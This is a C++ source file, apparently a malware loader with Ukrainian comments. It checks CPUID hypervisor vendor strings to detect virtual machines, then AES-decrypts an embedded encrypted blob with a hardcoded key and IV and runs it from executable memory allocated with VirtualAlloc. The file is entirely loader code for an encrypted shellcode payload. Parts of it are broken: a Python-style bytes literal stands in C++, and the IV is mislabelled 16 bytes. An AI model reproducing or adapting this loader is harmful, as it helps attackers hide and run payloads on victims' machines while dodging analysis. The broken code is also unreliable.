#include <windows.h>
#include <intrin.h>
#include <cstring>

bool IsVirtualMachine()
{
    int cpuInfo[4] = {};

    __cpuid(cpuInfo, 1);
    if (!(cpuInfo[2] & (1 << 31)))
        return false;

    const auto hypervisorQueryCode = 0x40000000;
    __cpuid(cpuInfo, hypervisorQueryCode);

    const int vendorStringLength = 13;
    using VendorString = char[vendorStringLength];

    VendorString detectedVendorId = {};
    memcpy(detectedVendorId + 0, &cpuInfo[1], 4);
    memcpy(detectedVendorId + 4, &cpuInfo[2], 4);
    memcpy(detectedVendorId + 8, &cpuInfo[3], 4);
    detectedVendorId[12] = '\0';

    static const VendorString knownHypervisors[]{
        "KVMKVMKVM\0\0\0", // KVM
        "Microsoft Hv",    // Microsoft Hyper-V or Windows Virtual PC
        "VMwareVMware",    // VMware
        "XenVMMXenVMM",    // Xen
        "prl hyperv  ",    // Parallels
        "VBoxVBoxVBox"     // VirtualBox
    };

    for (const auto& hypervisor : knownHypervisors)
    {
        if (!memcmp(hypervisor, detectedVendorId, vendorStringLength))
            return true;
    }

    return false;
}

unsigned char encrypted_data[] = '\xed8\xfbn\xb7\xb3\x08T\xfe\x8a\xd3\xcc\x96;\x13Lg\xeaw\xaf\xfb\xcaN\xa0\xa53\xb5\x040(\xc1.\xfd\x0c;JQ\xbe_\x1ab\x0e>\xba\x11(\x08&\xad\x94F\xd1N\x15\xb2\x8d+N\xd0X\x08+4\x89\xc1\xdd\x14,)\xf6\x93\x93\xbc\x81\xed\xd1k+X\x9a%@\x07\x1e\xef0\xc0\x96b\x88\xa2\xfdKZO/Y\x92\xf68\xe2b\xc3\x94\x80jr\xc0\xb9?\xda\x87d\xa2\\\xe0\xc6<\xad\xd4G\xceZa\x18\xea5\xfd@\xb9&\x04D\xb8\xe5\x8aK\xf0!\x82\xd0\xd9\x80\xbb\x9e+IH\xd5[\x15\xfd\xd9f<\\PIt\x14p\xd4\x8e\xb6\x06\xdc7_o\x86\xbf\x15\x90C\x19v#\xdc\xa9\xf1,\xe6bD\xee#\x07\xe5.a#\xc6\x0b?\x1f\xe7\xa3ON1\xec\xe2\xd4\xf3\xe8M36\xa0F\xa1\xcc/S\x8f\xc1;yL"\xcb\xb5\xb9\xedF\xd8\x00\xa08V\x1aU\xb6~\xc9V\x1e\\7\r\xef\x82ta\xc1\x0cr\x9a\xc40&\xd7u\x04]\xd5V\xeb$\xf9\xb3\x04a\xc5\x05\x86]\x00\xb2\xe9\x8a\n<\xdaB\xee\xaf\xcd\xa2\x1c\x8d\xfa\xaav:\xaf\xb8\xa5\xbf\xd4\x86\x8b\xda\xe0\r?\x99P\x82\xb59\x90\x8e\xd2C3)\x97\x05r\xf9I+-K\xf8\x85$,\xe4\xad\xd8\x9ep\xca\x8a\xd8|\xa9\xfc\xac\xc1.]Xy\x1e8N%\x92';
size_t data_length = sizeof(encrypted_data);

// AES ключ і IV
unsigned char aes_key[] = "thisisasecretkey"; // 16 байт
unsigned char aes_iv[] = "thisisaninitvectr"; // 16 байт

int main() {
    if (IsVirtualMachine()) {
        unsigned char decrypted_data[data_length];
        AES_KEY decrypt_key;

        AES_set_decrypt_key(aes_key, 128, &decrypt_key);

        for (size_t i = 0; i < data_length; i += AES_BLOCK_SIZE) {
            AES_cbc_encrypt(
                encrypted_data + i,             // Вхідний блок
                decrypted_data + i,             // Вихідний блок
                AES_BLOCK_SIZE,                 // Розмір блоку
                &decrypt_key,                   // Ключ
                aes_iv,                         // IV (оновлюється)
                AES_DECRYPT                     // Режим
            );
        }

        void* exec = VirtualAlloc(NULL, data_length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(exec, decrypted_data, data_length);
        ((void(*)())exec)();
    }

    return 0;
}
